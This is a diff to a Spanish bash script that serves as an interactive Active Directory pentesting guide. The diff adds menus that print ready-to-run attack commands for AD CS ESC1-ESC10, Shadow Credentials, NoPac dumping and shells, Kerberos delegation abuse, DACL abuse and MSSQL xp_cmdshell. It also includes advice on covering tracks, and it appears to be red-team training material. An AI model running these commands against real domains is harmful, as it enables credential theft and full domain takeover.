@@ -1,7 +1,7 @@
 #!/bin/bash
 
-# Active Directory Pentesting
-# Guía informativa
+# Active Directory Pentesting - Guía Completa Expandida
+# Incluye técnicas avanzadas de AD CS, Shadow Credentials, NoPac, Delegación Kerberos, etc.
 
 # Colores para la interfaz
 RED='\033[0;31m'
@@ -19,6 +19,7 @@ USERNAME=""
 PASSWORD=""
 NTLM_HASH=""
 TARGET_IP="192.168.1.20"
+CA_SERVER="ca.lab.local"
 
 # Función para mostrar el banner
 show_banner() {
@@ -38,9 +39,10 @@ show_banner() {
     echo -e "${YELLOW}Domain:${NC} $DOMAIN"
     echo -e "${YELLOW}Domain Controller:${NC} $DC_IP"
     echo -e "${YELLOW}Usuario:${NC} $USERNAME"
-
+    echo -e "${YELLOW}CA Server:${NC} $CA_SERVER"
     echo
 }
+
 # Función para pausa y continuar
 press_enter() {
     echo
@@ -59,11 +61,15 @@ show_command() {
     echo
 }
 
-# Función principal
+# ==============================================
+# NUEVOS MENÚS Y SECCIONES AÑADIDAS
+# ==============================================
+
+# Menú principal expandido
 main_menu() {
     while true; do
         show_banner
-        echo -e "${GREEN}Menú Principal:${NC}"
+        echo -e "${GREEN}Menú Principal Expandido:${NC}"
         echo "1. Reconocimiento y Enumeración"
         echo "2. Escalada de Privilegios y Credenciales"
         echo "3. Movimiento Lateral"
@@ -76,10 +82,16 @@ main_menu() {
         echo "10. Herramientas de Assessment"
         echo "11. Métodos de Ejecución y Descarga"
         echo "12. Herramientas de Comando y Control"
-        echo "13. Configuración de Entorno"
+        echo "13. Ataques a AD CS (PKI)"
+        echo "14. Shadow Credentials"
+        echo "15. NoPac (SamAccountName Spoofing)"
+        echo "16. Delegación de Kerberos"
+        echo "17. Ataques a MSSQL y SCCM"
+        echo "18. Abuso de DACLs"
+        echo "19. Configuración de Entorno"
         echo "0. Salir"
         echo
-        read -p "Selecciona una opción [0-13]: " option
+        read -p "Selecciona una opción [0-19]: " option
         
         case $option in
             1) recon_menu ;;
@@ -94,7 +106,13 @@ main_menu() {
             10) assessment_tools_menu ;;
             11) execution_menu ;;
             12) c2_menu ;;
-            13) config_menu ;;
+            13) adcs_attacks_menu ;;
+            14) shadow_credentials_menu ;;
+            15) nopac_attacks_menu ;;
+            16) kerberos_delegation_menu ;;
+            17) mssql_sccm_menu ;;
+            18) dacl_abuse_menu ;;
+            19) config_menu ;;
             0) exit 0 ;;
             *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; sleep 2 ;;
         esac
@@ -102,7 +120,7 @@ main_menu() {
 }
 
 # ==============================================
-# MENÚS PRINCIPALES
+# MENÚS PRINCIPALES EXISTENTES
 # ==============================================
 
 # Menú de Reconocimiento y Enumeración
@@ -153,9 +171,13 @@ privilege_menu() {
         echo "7. Abuso de Grupos Peligrosos (AdminSDHolder)"
         echo "8. Contraseñas en Group Policy Preferences (GPP)"
         echo "9. Abuso de contraseñas LAPS"
-        echo "10. Volver al Menú Principal"
+        echo "10. Shadow Credentials"
+        echo "11. NoPac Exploitation"
+        echo "12. AD CS Attacks"
+        echo "13. DACL Abuse"
+        echo "14. Volver al Menú Principal"
         echo
-        read -p "Selecciona una opción [1-10]: " option
+        read -p "Selecciona una opción [1-14]: " option
 
         case $option in
             1) kerberoasting_info ;;
@@ -167,7 +189,11 @@ privilege_menu() {
             7) dangerous_groups_info ;;
             8) gpp_passwords_info ;;
             9) laps_passwords_info ;;
-            10) break ;;
+            10) shadow_credentials_menu ;;
+            11) nopac_attacks_menu ;;
+            12) adcs_attacks_menu ;;
+            13) dacl_abuse_menu ;;
+            14) break ;;
             *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
         esac
     done
@@ -250,7 +276,6 @@ ptt_menu() {
         esac
     done
 }
-
 
 # Menú de Persistencia
 persistence_menu() {
@@ -465,9 +490,10 @@ config_menu() {
         echo "4. Configurar Contraseña"
         echo "5. Configurar Hash NTLM"
         echo "6. Configurar IP Objetivo"
-        echo "7. Volver al Menú Principal"
+        echo "7. Configurar CA Server"
+        echo "8. Volver al Menú Principal"
         echo
-        read -p "Selecciona una opción [1-7]: " option
+        read -p "Selecciona una opción [1-8]: " option
         
         case $option in
             1) read -p "Nuevo dominio: " DOMAIN; echo -e "${GREEN}Dominio configurado a: $DOMAIN${NC}"; sleep 2 ;;
@@ -476,15 +502,175 @@ config_menu() {
             4) read -s -p "Nueva contraseña: " PASSWORD; echo -e "${GREEN}\nContraseña configurada${NC}"; sleep 2 ;;
             5) read -s -p "Nuevo hash NTLM: " NTLM_HASH; echo -e "${GREEN}\nHash NTLM configurado${NC}"; sleep 2 ;;
             6) read -p "Nueva IP objetivo: " TARGET_IP; echo -e "${GREEN}IP objetivo configurado a: $TARGET_IP${NC}"; sleep 2 ;;
-            7) break ;;
+            7) read -p "Nuevo CA Server: " CA_SERVER; echo -e "${GREEN}CA Server configurado a: $CA_SERVER${NC}"; sleep 2 ;;
+            8) break ;;
             *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; sleep 2 ;;
         esac
     done
 }
 
+# ==============================================
+# NUEVOS MENÚS ESPECIALIZADOS
+# ==============================================
+
+# Menú de Ataques a AD CS
+adcs_attacks_menu() {
+    while true; do
+        show_banner
+        echo -e "${GREEN}Ataques a Active Directory Certificate Services:${NC}"
+        echo "1. Enumeración de AD CS"
+        echo "2. ESC1 - Misconfiguración de Plantillas"
+        echo "3. ESC3 - Enrolamiento de Agentes"
+        echo "4. ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2"
+        echo "5. ESC8 - ADCSPWN (Relaying to AD CS)"
+        echo "6. ESC9 - No Requiere Filtrar"
+        echo "7. ESC10 - Weak Certificate Mappings"
+        echo "8. Volver al Menú Principal"
+        echo
+        read -p "Selecciona una opción [1-8]: " option
+        
+        case $option in
+            1) adcs_enum_info ;;
+            2) esc1_attack_info ;;
+            3) esc3_attack_info ;;
+            4) esc6_attack_info ;;
+            5) esc8_attack_info ;;
+            6) esc9_attack_info ;;
+            7) esc10_attack_info ;;
+            8) break ;;
+            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
+        esac
+    done
+}
+
+# Menú de Shadow Credentials
+shadow_credentials_menu() {
+    while true; do
+        show_banner
+        echo -e "${GREEN}Shadow Credentials Attacks:${NC}"
+        echo "1. Enumeración de msDS-KeyCredentialLink"
+        echo "2. PyWhisker Attack"
+        echo "3. PKINITtools Exploitation"
+        echo "4. Limpieza de Shadow Credentials"
+        echo "5. Volver al Menú Principal"
+        echo
+        read -p "Selecciona una opción [1-5]: " option
+        
+        case $option in
+            1) shadow_creds_enum_info ;;
+            2) pywhisker_attack_info ;;
+            3) pkinit_tools_info ;;
+            4) shadow_creds_cleanup_info ;;
+            5) break ;;
+            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
+        esac
+    done
+}
+
+# Menú de NoPac Attacks
+nopac_attacks_menu() {
+    while true; do
+        show_banner
+        echo -e "${GREEN}NoPac (SamAccountName Spoofing):${NC}"
+        echo "1. Detección de Vulnerabilidad"
+        echo "2. NoPac.py Exploitation"
+        echo "3. CrackMapExec Module"
+        echo "4. Mitigaciones y Detección"
+        echo "5. Volver al Menú Principal"
+        echo
+        read -p "Selecciona una opción [1-5]: " option
+        
+        case $option in
+            1) nopac_detection_info ;;
+            2) nopac_exploitation_info ;;
+            3) nopac_cme_info ;;
+            4) nopac_mitigation_info ;;
+            5) break ;;
+            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
+        esac
+    done
+}
+
+# Menú de Delegación de Kerberos
+kerberos_delegation_menu() {
+    while true; do
+        show_banner
+        echo -e "${GREEN}Delegación de Kerberos:${NC}"
+        echo "1. Enumeración de Delegación"
+        echo "2. Unconstrained Delegation"
+        echo "3. Constrained Delegation"
+        echo "4. Resource-Based Constrained Delegation"
+        echo "5. Volver al Menú Principal"
+        echo
+        read -p "Selecciona una opción [1-5]: " option
+        
+        case $option in
+            1) kerberos_delegation_enum_info ;;
+            2) unconstrained_delegation_info ;;
+            3) constrained_delegation_info ;;
+            4) rbcd_delegation_info ;;
+            5) break ;;
+            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
+        esac
+    done
+}
+
+# Menú de MSSQL y SCCM Attacks
+mssql_sccm_menu() {
+    while true; do
+        show_banner
+        echo -e "${GREEN}Ataques a MSSQL y SCCM:${NC}"
+        echo "1. Enumeración de MSSQL"
+        echo "2. MSSQL Trusted Links"
+        echo "3. SCCM Infrastructure Discovery"
+        echo "4. SCCM Primary Users"
+        echo "5. SCCM Hunter"
+        echo "6. Volver al Menú Principal"
+        echo
+        read -p "Selecciona una opción [1-6]: " option
+        
+        case $option in
+            1) mssql_enum_info ;;
+            2) mssql_trusted_links_info ;;
+            3) sccm_discovery_info ;;
+            4) sccm_primary_users_info ;;
+            5) sccm_hunter_info ;;
+            6) break ;;
+            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
+        esac
+    done
+}
+
+# Menú de Abuso de DACLs
+dacl_abuse_menu() {
+    while true; do
+        show_banner
+        echo -e "${GREEN}Abuso de DACLs:${NC}"
+        echo "1. Enumeración de DACLs"
+        echo "2. GenericAll/GenericWrite"
+        echo "3. WriteProperty Attacks"
+        echo "4. ResetPassword/ForceChangePassword"
+        echo "5. AddMember Attacks"
+        echo "6. WriteOwner Attacks"
+        echo "7. Volver al Menú Principal"
+        echo
+        read -p "Selecciona una opción [1-7]: " option
+        
+        case $option in
+            1) dacl_enum_info ;;
+            2) generic_all_write_info ;;
+            3) write_property_info ;;
+            4) reset_password_info ;;
+            5) add_member_info ;;
+            6) write_owner_info ;;
+            7) break ;;
+            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
+        esac
+    done
+}
 
 # ==============================================
-# INFORMACIÓN SOBRE TÉCNICAS (FUNCIONES INFO)
+# FUNCIONES DE INFORMACIÓN EXISTENTES
 # ==============================================
 
 # --- Reconocimiento y Enumeración ---
@@ -578,7 +764,7 @@ share_enum_info() {
     show_command "smbclient //$TARGET_IP/ShareName -c 'ls'" "Conectar a un share y listar archivos"
     echo -e "${MAGENTA}Objetivo:${NC} Encontrar recursos compartidos (shares) de red y analizar sus permisos."
     echo -e "${MAGENTA}Herramientas útiles:${NC} smbclient, smbmap, crackmapexec, PowerView."
-    echo -e "${MAGENTA}Notas:${NC} La sesión nula permite enumerar shares sin autenticación. Busca siempre shares como SYSVOL y NETLOGON en los DCs, ya que pueden contener scripts de logon o GPOs. Un share con permisos de escritura para 'Everyone' es un gran hallazgo."
+    echo -e "${MAGENTA}Notas:${NC} La sesión nula permite enumerar shares sin autenticación. Busca siempre shares como SYSVOL y NETLOGON en los DCs, ya que pueden contener scripts de logon o GPOs. Un share with permisos de escritura para 'Everyone' es un gran hallazgo."
     press_enter
 }
 
@@ -728,7 +914,7 @@ laps_passwords_info() {
     echo -e "${GREEN}Extracción de Contraseñas LAPS:${NC}"
     echo
     show_command "Get-ADComputer -Identity COMPUTER_NAME -Properties ms-Mcs-AdmPwd" "Leer la contraseña LAPS de un equipo específico"
-    show_command "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object { \$_.\\\'ms-Mcs-AdmPwd\\\' -ne \\\$null }" "Encontrar todos los equipos con la contraseña LAPS visible para ti"
+    show_command "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object { \$_.'ms-Mcs-AdmPwd' -ne \$null }" "Encontrar todos los equipos con la contraseña LAPS visible para ti"
     echo -e "${MAGENTA}Objetivo:${NC} Extraer las contraseñas de administrador local de las computadoras, que son gestionadas por LAPS."
     echo -e "${MAGENTA}Requisitos:${NC} Permisos delegados en AD para leer el atributo 'ms-Mcs-AdmPwd' de los objetos de computadora."
     echo -e "${MAGENTA}Herramientas útiles:${NC} Módulo LAPS de PowerShell, PowerView."
@@ -1174,7 +1360,7 @@ koadic_info() {
     show_command "run" "Ejecutar stager"
     echo -e "${MAGENTA}Objetivo:${NC} Establecer un canal de comando and control usando binarios nativos de Windows."
     echo -e "${MAGENTA}Herramientas útiles:${NC} Koadic, stagers de MSHTA/WMIC/regsvr32."
-    echo -e "${MAGENTA}Notas:${NC} Koadic es un framework post-explotación similar a Meterpreter but focused on Windows environments. Usa JavaScript and COM objects."
+    echo -e "${MAGENTA}Notas:${NC} Koadic es un framework post-explotación similar to Meterpreter but focused on Windows environments. Usa JavaScript and COM objects."
     press_enter
 }
 
@@ -1230,9 +1416,397 @@ cobalt_strike_info() {
 }
 
 # ==============================================
+# NUEVAS FUNCIONES DE INFORMACIÓN
+# ==============================================
+
+# --- AD CS Attacks ---
+adcs_enum_info() {
+    show_banner
+    echo -e "${GREEN}Enumeración de AD CS:${NC}"
+    echo
+    show_command "certipy find -u $USERNAME@$DOMAIN -p '$PASSWORD' -dc-ip $DC_IP" "Enumerar AD CS con Certipy"
+    show_command "Get-ADObject -Filter * -SearchBase \"CN=Configuration,DC=$DOMAIN\" | Where-Object { \$_.Name -like \"*CA*\" }" "Buscar objetos de CA con PowerShell"
+    show_command "nmap -p 88,135,139,445,636,3268,3269,5985,5986 $CA_SERVER" "Escaneo de puertos en servidor CA"
+    echo -e "${MAGENTA}Objetivo:${NC} Identificar servidores de Certificate Authority y configuraciones vulnerables."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} Certipy, PowerShell, ldapsearch, BloodHound."
+    echo -e "${MAGENTA}Notas:${NC} AD CS es un componente crítico que often contiene configuraciones vulnerables. Buscar plantillas con enrolamiento automático, permisos débiles, y configuraciones inseguras."
+    press_enter
+}
+
+esc1_attack_info() {
+    show_banner
+    echo -e "${GREEN}ESC1 - Misconfiguración de Plantillas:${NC}"
+    echo
+    show_command "certipy req -u $USERNAME@$DOMAIN -p '$PASSWORD' -target $CA_SERVER -template VulnerableTemplate -ca CA-Name" "Solicitar certificado con plant vulnerable"
+    show_command "certipy auth -cert certificate.pem -key private.key" "Autenticarse con certificado"
+    echo -e "${MAGENTA}Objetivo:${NC} Abusar de plantillas de certificado mal configuradas que permiten enrolamiento automático y autenticación."
+    echo -e "${MAGENTA}Requisitos:${NC} Plantilla con enrolamiento automático habilitado y permisos débiles."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} Certipy, PowerShell AD Module."
+    echo -e "${MAGENTA}Notas:${NC} ESC1 permite a usuarios normales obtener certificados para autenticación como cualquier usuario del dominio."
+    press_enter
+}
+
+esc3_attack_info() {
+    show_banner
+    echo -e "${GREEN}ESC3 - Enrolamiento de Agentes:${NC}"
+    echo
+    show_command "certipy req -u $USERNAME@$DOMAIN -p '$PASSWORD' -target $CA_SERVER -template EnrollmentAgent -ca CA-Name" "Solicitar certificado de agente de enrolamiento"
+    show_command "certipy req -u $USERNAME@$DOMAIN -p '$PASSWORD' -target $CA_SERVER -template User -on-behalf-of 'domain\\user' -pfx enrollment_agent.pfx" "Solicitar certificado en nombre de otro usuario"
+    echo -e "${MAGENTA}Objetivo:${NC} Abusar de plantillas de agente de enrolamiento para solicitar certificados en nombre de otros usuarios."
+    echo -e "${MAGENTA}Requisitos:${NC} Plantilla de agente de enrolamiento mal configurada."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} Certipy, PowerShell."
+    echo -e "${MAGENTA}Notas:${NC} ESC3 permite a un atacante con un certificado de agente de enrolamiento solicitar certificados para cualquier usuario del dominio."
+    press_enter
+}
+
+esc6_attack_info() {
+    show_banner
+    echo -e "${GREEN}ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2:${NC}"
+    echo
+    show_command "certipy req -u $USERNAME@$DOMAIN -p '$PASSWORD' -target $CA_SERVER -template User -alt 'administrator@$DOMAIN'" "Solicitar certificado con SAN alternativo"
+    echo -e "${MAGENTA}Objetivo:${NC} Abusar de la configuración EDITF_ATTRIBUTESUBJECTALTNAME2 en la CA para solicitar certificados con nombres alternativos."
+    echo -e "${MAGENTA}Requisitos:${NC} Configuración EDITF_ATTRIBUTESUBJECTALTNAME2 habilitada en la CA."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} Certipy, PowerShell."
+    echo -e "${MAGENTA}Notas:${NC} ESC6 permite a un usuario solicitar un certificado con un nombre alternativo (SAN) de cualquier usuario del dominio si la CA tiene EDITF_ATTRIBUTESUBJECTALTNAME2 habilitado."
+    press_enter
+}
+
+esc8_attack_info() {
+    show_banner
+    echo -e "${GREEN}ESC8 - ADCSPWN (Relaying to AD CS):${NC}"
+    echo
+    show_command "python3 ADCSPWN.py --target $CA_SERVER --attack-interface eth0" "Ejecutar ADCSPWN para relaying"
+    show_command "certipy req -username 'DOMAIN\\USER' -password 'PASSWORD' -target $CA_SERVER" "Solicitar certificado después del relay"
+    echo -e "${MAGENTA}Objetivo:${NC} Realizar relaying de autenticaciones NTLM hacia AD CS para obtener certificados."
+    echo -e "${MAGENTA}Requisitos:${NC} Servidor AD CS vulnerable a relaying and HTTP Endpoint habilitado."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} ADCSPWN, Certipy, ntlmrelayx."
+    echo -e "${MAGENTA}Notas:${NC} ESC8 es una vulnerabilidad crítica que permite convertir autenticaciones NTLM en certificados válidos para autenticación Kerberos."
+    press_enter
+}
+
+esc9_attack_info() {
+    show_banner
+    echo -e "${GREEN}ESC9 - No Requiere Filtrar:${NC}"
+    echo
+    show_command "certipy req -u $USERNAME@$DOMAIN -p '$PASSWORD' -target $CA_SERVER -template VulnerableTemplateNoRequireManagerApproval" "Solicitar certificado sin aprobación del manager"
+    echo -e "${MAGENTA}Objetivo:${NC} Abusar de plantillas que no requieren aprobación del manager para obtener certificados."
+    echo -e "${MAGENTA}Requisitos:${NC} Plantilla con la opción 'Require manager approval' deshabilitada."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} Certipy, PowerShell."
+    echo -e "${MAGENTA}Notas:${NC} ESC9 permite a usuarios solicitar certificados sin necesidad de aprobación adicional, facilitando el ataque."
+    press_enter
+}
+
+esc10_attack_info() {
+    show_banner
+    echo -e "${GREEN}ESC10 - Weak Certificate Mappings:${NC}"
+    echo
+    show_command "certipy auth -cert certificate.pem -key private.key -domain $DOMAIN -dc-ip $DC_IP" "Autenticarse con mapeo débil de certificados"
+    echo -e "${MAGENTA}Objetivo:${NC} Abusar de mapeos débiles de certificados a cuentas de usuario."
+    echo -e "${MAGENTA}Requisitos:${NC} Configuración de mapeo de certificados débil."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} Certipy, PowerShell."
+    echo -e "${MAGENTA}Notas:${NC} ESC10 explota configuraciones débiles en el mapeo de certificados a cuentas de usuario, permitiendo suplantación de identidad."
+    press_enter
+}
+
+# --- Shadow Credentials ---
+shadow_creds_enum_info() {
+    show_banner
+    echo -e "${GREEN}Enumeración de Shadow Credentials:${NC}"
+    echo
+    show_command "Get-ADUser -Identity targetuser -Properties msDS-KeyCredentialLink" "Verificar KeyCredentialLink con PowerShell"
+    show_command "ldapsearch -h $DC_IP -D \"$USERNAME@$DOMAIN\" -w '$PASSWORD' -b \"dc=$DOMAIN\" \"(objectClass=user)\" msDS-KeyCredentialLink" "Buscar via LDAP"
+    echo -e "${MAGENTA}Objetivo:${NC} Identificar usuarios con msDS-KeyCredentialLink configurado."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} PowerShell, ldapsearch, BloodHound."
+    echo -e "${MAGENTA}Notas:${NC} El atributo msDS-KeyCredentialLink almacena credenciales alternativas para autenticación PKINIT."
+    press_enter
+}
+
+pywhisker_attack_info() {
+    show_banner
+    echo -e "${GREEN}PyWhisker Attack:${NC}"
+    echo
+    show_command "python3 pywhisker.py -d $DOMAIN -u $USERNAME -p '$PASSWORD' --target targetuser --action add" "Añadir shadow credentials"
+    show_command "python3 pywhisker.py -d $DOMAIN -u $USERNAME -p '$PASSWORD' --target targetuser --action list" "Listar shadow credentials"
+    echo -e "${MAGENTA}Objetivo:${NC} Añadir shadow credentials a una cuenta de usuario para posterior autenticación PKINIT."
+    echo -e "${MAGENTA}Requisitos:${NC} Permisos de escritura sobre el atributo msDS-KeyCredentialLink del usuario objetivo."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} PyWhisker, PowerShell."
+    echo -e "${MAGENTA}Notas:${NC} PyWhisker es la herramienta principal para ataques de shadow credentials. Requiere .NET Framework 4.5+ y PowerShell 5.0+."
+    press_enter
+}
+
+pkinit_tools_info() {
+    show_banner
+    echo -e "${GREEN}PKINITtools Exploitation:${NC}"
+    echo
+    show_command "python3 PKINITtools/gettgtpkinit.py -cert-pem certificate.pem -key-pem private.key $DOMAIN/targetuser targetuser.ccache" "Obtener TGT con PKINIT"
+    show_command "export KRB5CCNAME=targetuser.ccache" "Establecer variable de entorno para el ticket"
+    show_command "python3 secretsdump.py -k -no-pass $DOMAIN/targetuser@$DC_IP" "Usar el ticket para dumpear secretos"
+    echo -e "${MAGENTA}Objetivo:${NC} Usar certificados para autenticación PKINIT y obtener acceso."
+    echo -e "${MAGENTA}Requisitos:${NC} Certificado válido y clave privada."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} PKINITtools, Impacket."
+    echo -e "${MAGENTA}Notas:${NC} PKINIT permite la autenticación Kerberos usando certificados en lugar de contraseñas."
+    press_enter
+}
+
+shadow_creds_cleanup_info() {
+    show_banner
+    echo -e "${GREEN}Limpieza de Shadow Credentials:${NC}"
+    echo
+    show_command "python3 pywhisker.py -d $DOMAIN -u $USERNAME -p '$PASSWORD' --target targetuser --action remove" "Eliminar shadow credentials"
+    show_command "Get-ADUser -Identity targetuser -Properties msDS-KeyCredentialLink | Set-ADUser -Clear msDS-KeyCredentialLink" "Limpiar atributo con PowerShell"
+    echo -e "${MAGENTA}Objetivo:${NC} Eliminar shadow credentials para cubrir huellas."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} PyWhisker, PowerShell."
+    echo -e "${MAGENTA}Notas:${NC} Es importante limpiar después de un ataque para evitar detección y mantener el acceso sigiloso."
+    press_enter
+}
+
+# --- NoPac Attacks ---
+nopac_detection_info() {
+    show_banner
+    echo -e "${GREEN}Detección de Vulnerabilidad NoPac:${NC}"
+    echo
+    show_command "nmap -p 88 --script krb5-security-mode $DC_IP" "Detectar si el DC es vulnerable"
+    show_command "python3 noPac.py $DOMAIN/$USERNAME:'$PASSWORD' -dc-ip $DC_IP -scan" "Escanear con noPac.py"
+    echo -e "${MAGENTA}Objetivo:${NC} Identificar Domain Controllers vulnerables a CVE-2021-42278 and CVE-2021-42287."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} noPac.py, nmap, CrackMapExec."
+    echo -e "${MAGENTA}Notas:${NC} NoPac afecta a Windows Server 2016-2022. La detección puede realizarse verificando la versión del OS o mediante escaneo específico."
+    press_enter
+}
+
+nopac_exploitation_info() {
+    show_banner
+    echo -e "${GREEN}Explotación de NoPac:${NC}"
+    echo
+    show_command "python3 noPac.py $DOMAIN/$USERNAME:'$PASSWORD' -dc-ip $DC_IP -impersonate administrator -dump" "Explotar y dumpear hashes"
+    show_command "python3 noPac.py $DOMAIN/$USERNAME:'$PASSWORD' -dc-ip $DC_IP -impersonate administrator -shell" "Obtener shell"
+    echo -e "${MAGENTA}Objetivo:${NC} Explotar la vulnerabilidad NoPac para elevar privilegios a Domain Admin."
+    echo -e "${MAGENTA}Requisitos:${NC} Credenciales de cualquier usuario de dominio and DC vulnerable."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} noPac.py, Impacket."
+    echo -e "${MAGENTA}Notas:${NC} NoPac permite suplantar cualquier cuenta de dominio incluyendo Domain Admins. Es critical parchear los DCs con las actualizaciones de Noviembre 2021 o posteriores."
+    press_enter
+}
+
+nopac_cme_info() {
+    show_banner
+    echo -e "${GREEN}NoPac con CrackMapExec:${NC}"
+    echo
+    show_command "crackmapexec smb $DC_IP -u $USERNAME -p '$PASSWORD' -M nopac" "Ejecutar módulo nopac de CrackMapExec"
+    echo -e "${MAGENTA}Objetivo:${NC} Explotar NoPac usando CrackMapExec."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} CrackMapExec."
+    echo -e "${MAGENTA}Notas:${NC} CrackMapExec proporciona un módulo para explotar NoPac de manera automatizada."
+    press_enter
+}
+
+nopac_mitigation_info() {
+    show_banner
+    echo -e "${GREEN}Mitigaciones y Detección de NoPac:${NC}"
+    echo
+    show_command "Get-HotFix -Id KB5008602, KB5008380" "Verificar parches instalados"
+    echo -e "${MAGENTA}Objetivo:${NC} Mitigar y detectar explotación de NoPac."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} PowerShell, Windows Update."
+    echo -e "${MAGENTA}Notas:${NC} Los parches KB5008602 and KB5008380 mitigan CVE-2021-42278 and CVE-2021-42287. Monitorizar eventos de seguridad para detectar intentos de explotación."
+    press_enter
+}
+
+# --- Delegación de Kerberos ---
+kerberos_delegation_enum_info() {
+    show_banner
+    echo -e "${GREEN}Enumeración de Delegación Kerberos:${NC}"
+    echo
+    show_command "Get-ADComputer -Filter {TrustedForDelegation -eq \$true}" "Enumerar unconstrained delegation"
+    show_command "Get-ADUser -Filter {TrustedToAuthForDelegation -eq \$true}" "Enumerar constrained delegation"
+    show_command "Find-DomainUserDelegation -Domain $DOMAIN" "Enumerar con PowerView"
+    echo -e "${MAGENTA}Objetivo:${NC} Identificar configuraciones de delegación Kerberos en el dominio."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} PowerShell, PowerView, BloodHound."
+    echo -e "${MAGENTA}Notas:${NC} La delegación Kerberos es una característica poderosa que often se configura incorrectamente, permitiendo a atacantes moverse lateralmente y escalar privilegios."
+    press_enter
+}
+
+unconstrained_delegation_info() {
+    show_banner
+    echo -e "${GREEN}Unconstrained Delegation:${NC}"
+    echo
+    show_command "sekurlsa::tickets /export" "Exportar tickets con Mimikatz"
+    show_command "Invoke-Mimikatz -Command '\"sekurlsa::tickets /export\"'" "Exportar tickets con PowerSploit"
+    echo -e "${MAGENTA}Objetivo:${NC} Abusar de delegación no restringida para robar tickets de otros usuarios."
+    echo -e "${MAGENTA}Requisitos:${NC} Acceso a un sistema con delegación no restringida."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} Mimikatz, PowerSploit."
+    echo -e "${MAGENTA}Notas:${NC} La delegación no restringida permite a un servicio suplantar a usuarios en cualquier servicio. Es una configuración peligrosa que debe evitarse."
+    press_enter
+}
+
+constrained_delegation_info() {
+    show_banner
+    echo -e "${GREEN}Constrained Delegation:${NC}"
+    echo
+    show_command "getST.py -impersonate administrator -spn host/dc.domain.local -dc-ip $DC_IP domain/user:password" "Obtener ticket de servicio con Impacket"
+    show_command "Rubeus.exe s4u /user:user /rc4:hash /impersonateuser:administrator /msdsspn:host/dc.domain.local /altservice:http /ptt" "Obtener ticket con Rubeus"
+    echo -e "${MAGENTA}Objetivo:${NC} Abusar de delegación restringida para suplantar usuarios en servicios específicos."
+    echo -e "${MAGENTA}Requisitos:${NC} Credenciales o hash de una cuenta con delegación restringida configurada."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} Impacket, Rubeus."
+    echo -e "${MAGENTA}Notas:${NC} La delegación restringida limita los servicios a los que un servicio puede delegar credenciales, pero aún puede ser abused si se comprometen las credenciales."
+    press_enter
+}
+
+rbcd_delegation_info() {
+    show_banner
+    echo -e "${GREEN}Resource-Based Constrained Delegation:${NC}"
+    echo
+    show_command "Set-ADComputer -Identity targetcomputer -PrincipalsAllowedToDelegateToAccount attackercomputer$" "Configurar RBCD"
+    show_command "getST.py -spn host/targetcomputer.$DOMAIN -impersonate administrator $DOMAIN/attackercomputer\$:Password123" "Obtener ticket de servicio"
+    echo -e "${MAGENTA}Objetivo:${NC} Abusar de RBCD para obtener acceso a recursos delegados."
+    echo -e "${MAGENTA}Requisitos:${NC} Control sobre una cuenta con permisos para modificar PrincipalsAllowedToDelegateToAccount."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} PowerShell, Impacket, Rubeus."
+    echo -e "${MAGENTA}Notas:${NC} RBCD es más seguro que constrained delegation tradicional pero aún puede ser explotado si se tienen los permisos adecuados."
+    press_enter
+}
+
+# --- MSSQL and SCCM Attacks ---
+mssql_enum_info() {
+    show_banner
+    echo -e "${GREEN}Enumeración de MSSQL:${NC}"
+    echo
+    show_command "nmap -p 1433 --script ms-sql-info $TARGET_IP" "Enumerar instancias MSSQL"
+    show_command "sqsh -S $TARGET_IP -U $USERNAME -P '$PASSWORD'" "Conectar a MSSQL"
+    show_command "Get-SQLInstanceDomain -Domain $DOMAIN" "Enumerar instancias con PowerUpSQL"
+    echo -e "${MAGENTA}Objetivo:${NC} Identificar servidores MSSQL y configuraciones vulnerables."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} nmap, sqsh, PowerUpSQL, CrackMapExec."
+    echo -e "${MAGENTA}Notas:${NC} MSSQL often contiene datos sensibles y puede ser usado para movimiento lateral mediante linked servers o xp_cmdshell."
+    press_enter
+}
+
+mssql_trusted_links_info() {
+    show_banner
+    echo -e "${GREEN}MSSQL Trusted Links:${NC}"
+    echo
+    show_command "EXECUTE('sp_linkedservers') AT \"linkedserver\"" "Enumerar servidores vinculados"
+    show_command "EXECUTE('xp_cmdshell ''whoami''') AT \"linkedserver\"" "Ejecutar comandos a través de servidor vinculado"
+    echo -e "${MAGENTA}Objetivo:${NC} Abusar de servidores vinculados en MSSQL para movimiento lateral."
+    echo -e "${MAGENTA}Requisitos:${NC} Acceso a MSSQL con permisos para ejecutar comandos en servidores vinculados."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} PowerUpSQL, sqsh, mssqlclient.py."
